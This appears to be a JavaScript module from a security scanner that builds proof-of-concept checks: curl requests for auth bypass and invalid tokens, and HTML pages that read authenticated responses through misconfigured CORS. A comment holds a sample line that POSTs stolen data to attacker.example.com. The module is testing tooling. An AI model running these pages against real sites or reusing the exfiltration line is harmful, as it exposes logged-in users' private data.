// Proof-of-concept generators for findings.
//
// Every PoC is self-contained and focused: a single command or single HTML
// file the user can paste into a terminal / browser and verify the issue
// themselves. We never automate exploitation — PoCs are read-only demonstrations.

function shellQuote(s) {
  // Conservative single-quote wrap for bash/zsh. Backticks and $ survive as
  // literal characters inside single quotes.
  return `'${String(s).replace(/'/g, `'\\''`)}'`;
}

function curlFlags({ method, headers = {}, body }) {
  const parts = [`-i`, `-sS`, `--max-time`, `15`, `-X`, method || 'GET'];
  // Drop headers that curl regenerates (would otherwise conflict or mislead).
  const drop = new Set(['content-length', 'host', 'connection']);
  for (const [k, v] of Object.entries(headers)) {
    if (drop.has(k.toLowerCase())) continue;
    parts.push('-H', shellQuote(`${k}: ${v}`));
  }
  if (body && method && !['GET', 'HEAD'].includes(method.toUpperCase())) {
    parts.push('--data-binary', shellQuote(body));
  }
  return parts;
}

function pocAuthBypass({ endpoint, sample }) {
  // sample.headers is the request we originally captured — we KEEP everything
  // except the auth markers, so the PoC matches the real request shape.
  const stripped = {};
  const authRe = /^(authorization|cookie|x-api-key|x-auth-token|x-csrf-token)$/i;
  for (const [k, v] of Object.entries(sample.headers || {})) {
    if (!authRe.test(k)) stripped[k] = v;
  }
  const parts = [
    'curl',
    ...curlFlags({ method: endpoint.method, headers: stripped, body: sample.body }),
    shellQuote(sample.url || endpoint.url)
  ];
  return {
    kind: 'curl',
    title: `Auth bypass — ${endpoint.method} ${endpoint.url}`,
    description:
      'If this request succeeds (2xx with meaningful body) while the ' +
      'original required authentication, the endpoint is missing or ' +
      'mis-applying its auth check.',
    content: parts.join(' \\\n  ')
  };
}

function pocInvalidToken({ endpoint, sample }) {
  const headers = { ...(sample.headers || {}) };
  // Replace auth with obviously invalid values — keeps the request shape
  // identical so we isolate the "validation" layer.
  headers['Authorization'] = 'Bearer invalid-token-for-poc-only';
  for (const k of Object.keys(headers)) {
    if (/^cookie$/i.test(k)) headers[k] = 'session=invalid-for-poc';
  }
  const parts = [
    'curl',
    ...curlFlags({ method: endpoint.method, headers, body: sample.body }),
    shellQuote(sample.url || endpoint.url)
  ];
  return {
    kind: 'curl',
    title: `Invalid-token acceptance — ${endpoint.method} ${endpoint.url}`,
    description:
      'A 2xx response here means the server does not actually validate the ' +
      'bearer token / session cookie before serving the resource.',
    content: parts.join(' \\\n  ')
  };
}

function pocCorsReflected({ endpoint, sample, attackerOrigin }) {
  const url = sample.url || endpoint.url;
  const html =
`<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>CORS PoC — ${escapeHtml(endpoint.url)}</title></head>
<body>
<h1>CORS misconfiguration PoC</h1>
<p>Host this file on <code>${escapeHtml(attackerOrigin)}</code>. Open it in a
browser where the victim is logged into <code>${escapeHtml(new URL(url).host)}</code>
in another tab. The response body below should be cross-origin unreadable —
if it isn't, any attacker-controlled page can exfiltrate it.</p>
<pre id="out" style="max-height:40vh;overflow:auto;background:#111;color:#0f0;padding:12px">(loading...)</pre>
<script>
(async () => {
  try {
    const r = await fetch(${JSON.stringify(url)}, {
      method: ${JSON.stringify(endpoint.method || 'GET')},
      credentials: 'include',
      headers: { 'Accept': 'application/json, */*' }
    });
    const text = await r.text();
    document.getElementById('out').innerText =
      'status: ' + r.status + '\\n\\n' + text;
    // Real exfiltration would look like:
    //   fetch('https://attacker.example.com/steal', { method: 'POST', body: text });
  } catch (e) {
    document.getElementById('out').innerText = 'Blocked by browser: ' + e;
  }
})();
</script>
</body>
</html>`;
  return {
    kind: 'html',
    title: `CORS reflected origin — ${endpoint.method} ${endpoint.url}`,
    description:
      'Host on ' + attackerOrigin + '. The fetch runs with credentials. If ' +
      'the server reflects Origin back in Access-Control-Allow-Origin and ' +
      'sets Access-Control-Allow-Credentials: true, the response is readable.',
    content: html
  };
}

function pocCorsNull({ endpoint, sample }) {
  // "null" Origin arises from sandboxed iframes, data: URLs, file:// navigation,
  // and some redirects. Demonstrating it requires an iframe with a sandbox
  // attribute (which produces null origin).
  const url = sample.url || endpoint.url;
  const inner =
`<script>
(async () => {
  try {
    const r = await fetch(${JSON.stringify(url)}, {
      method: ${JSON.stringify(endpoint.method || 'GET')},
      credentials: 'include'
    });
    const t = await r.text();
    parent.postMessage({ status: r.status, body: t.slice(0, 4096) }, '*');
  } catch (e) { parent.postMessage({ error: String(e) }, '*'); }
})();
<\/script>`;
  const html =
`<!doctype html>
<html><body>
<h1>CORS null-origin PoC</h1>
<pre id="out">(waiting for iframe...)</pre>
<iframe sandbox="allow-scripts" srcdoc=${JSON.stringify(inner)}></iframe>
<script>
window.addEventListener('message', (e) => {
  document.getElementById('out').innerText = JSON.stringify(e.data, null, 2);
});
</script>
</body></html>`;
  return {
    kind: 'html',
    title: `CORS null origin — ${endpoint.method} ${endpoint.url}`,
    description:
      'A sandboxed iframe produces a null Origin. If the server returns ' +
      'Access-Control-Allow-Origin: null with credentials, any site can embed ' +
      'this iframe and exfiltrate authenticated responses.',
    content: html
  };
}

function pocCorsWildcardCreds({ endpoint, sample }) {
  const url = sample.url || endpoint.url;
  return {
    kind: 'curl',
    title: `CORS wildcard + credentials — ${endpoint.method} ${endpoint.url}`,
    description:
      'Confirm that the server is sending both Access-Control-Allow-Origin: * ' +
      'and Access-Control-Allow-Credentials: true. Most browsers refuse to ' +
      'combine these, so the immediate blast radius is smaller than a ' +
      'reflected origin — still a dangerous config.',
    content:
      `curl -i -sS --max-time 15 -X ${endpoint.method || 'GET'} \\\n` +
      `  -H 'Origin: https://attacker.example.com' \\\n` +
      `  ${shellQuote(url)}`
  };
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[c]));
}

module.exports = {
  pocAuthBypass,
  pocInvalidToken,
  pocCorsReflected,
  pocCorsNull,
  pocCorsWildcardCreds
};
